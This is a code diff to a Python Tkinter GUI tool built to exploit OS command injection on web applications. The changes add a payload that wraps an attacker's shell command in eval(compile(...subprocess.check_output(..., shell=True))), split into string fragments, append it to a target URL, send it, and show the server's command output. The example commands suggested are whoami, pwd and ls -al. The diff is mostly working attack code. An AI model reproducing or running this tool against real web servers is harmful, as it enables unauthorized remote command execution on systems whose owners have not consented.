@@ -1,6 +1,8 @@
 from tkinter import *
 import os
 from tkinter import ttk
+from typing import Any, Union
+from bs4 import BeautifulSoup as Soup
 import requests
 
 
@@ -45,16 +47,28 @@ def show_tree():
     treeview.bind('<<TreeviewOpen>>', update_tree)
 
 
-def Take_input(inputurl, inputpayload, output):
+def Take_input(inputurl, inputpayload,inputexpression,output):
     url = inputurl.get("1.0", "end-1c")
-    payload = inputpayload.get("1.0", "end-1c")
-    target = str(url) + payload
+    # payload = inputpayload.get("1.0", "end-1c")
+    # expression = inputexpression.get("1.0", "end-1c")
+
     try:
-        results = requests.get(url=target)
-        if "www-data" in str(results.text):
-            output.insert(END, 'OS Command Injection Successfully!')
+        if inputpayload.get("1.0", END) == "\n":
+            payload = inputexpression.get("1.0", "end-1c")
+            site_request = requests.get(str(url) + str(payload))
         else:
-            output.insert(END, "Nothing Found!")
+            payload = inputpayload.get("1.0", "end-1c")
+            example = ("eval(compile(\"\"\"f"
+                       "or x in range(1):\\n"
+                       " import subprocess\\"
+                       "n subprocess.check_o"
+                       f"utput(r\'{payload}\',s"
+                       "hell=True)\"\"\",\'"
+                       "\',\'single\'))").format(payload)
+            site_request = requests.get(str(url) + example)
+        site_response = str(site_request.content)
+        soup = Soup(site_response, "html.parser")
+        output.insert(END, soup.find('strong').text + '\n')
     except ConnectionError:
         print("Connection Error. Try Again.")
 
@@ -62,38 +76,85 @@ def Take_input(inputurl, inputpayload, output):
 def os_injection():
     root = Toplevel(master)
     root.title("Os command injection")
-    root.geometry("470x300")
-    l = Label(root, text="Enter the url like this \nschema://subdomain.domain.tld/path/document.extension?parameter=",
+    root.geometry("900x500")
+
+    l1 = Label(root, text="Enter the payload (e.g whoami,pwd,ls -al)",
+               fg="grey",
+               )
+    inputtxt1 = Text(root,
+                     height=0,
+                     width=25,
+                     bg="light yellow")
+
+
+    example = ("eval(compile(\"\"\"f"
+               "or x in range(1):\\n"
+               " import subprocess\\"
+               "n subprocess.check_o"
+               "utput(r\'COMMAND\',s"
+               "hell=True)\"\"\",\'"
+               "\',\'single\'))")
+
+    l2 = Label(root, text=f"Or enter the full expression \n(e.g {example})",
+               fg="grey",
+               )
+
+    inputtxt2 = Text(root,
+                     height=3,
+                     width=95,
+                     bg="light yellow")
+
+    Output = Text(root, height=10,
+                  width=100,
+                  bg="light cyan")
+
+    Display = Button(root, height=2,
+                     width=12,
+                     text="Test",
+                     command=lambda: Take_input(inputtxt, inputtxt1,inputtxt2, Output))
+
+    OPTIONS = [
+        "Payload",
+        "Expression",
+    ]  # etc
+
+    variable = StringVar(root)
+    variable.set(OPTIONS[0])  # default value
+
+    w = OptionMenu(root, variable, *OPTIONS)
+    w.pack()
+
+    def ok():
+        if variable.get() == "Payload":
+            l1.pack()
+            inputtxt1.pack(pady=10)
+            Display.pack(pady=10)
+            Output.pack()
+            w.destroy()
+            button.destroy()
+        else:
+            l2.pack()
+            inputtxt2.pack(pady=10)
+            Display.pack(pady=10)
+            Output.pack()
+            w.destroy()
+            button.destroy()
+
+    button = Button(root,text="Choose method",command=ok)
+    button.pack()
+    # button = Button(root, text="Choose method", command=ok)
+    # button.pack()
+
+    l = Label(root, text="Enter the url like this \nschema://subdomain.domain.tld/path?parameter=",
               fg="grey",
               )
     inputtxt = Text(root,
                     height=0,
                     width=55,
                     bg="light yellow")
-
-    l1 = Label(root, text="Enter the url payload",
-               fg="grey",
-               )
-
-    inputtxt1 = Text(root,
-                     height=0,
-                     width=25,
-                     bg="light yellow")
-
-    Output = Text(root, height=3,
-                  width=14,
-                  bg="light cyan")
-
-    Display = Button(root, height=2,
-                     width=12,
-                     text="Test",
-                     command=lambda: Take_input(inputtxt, inputtxt1, Output))
     l.pack()
     inputtxt.pack(pady=10)
-    l1.pack()
-    inputtxt1.pack(pady=10)
-    Display.pack(pady=10)
-    Output.pack()
+
 
 
 if __name__ == '__main__':
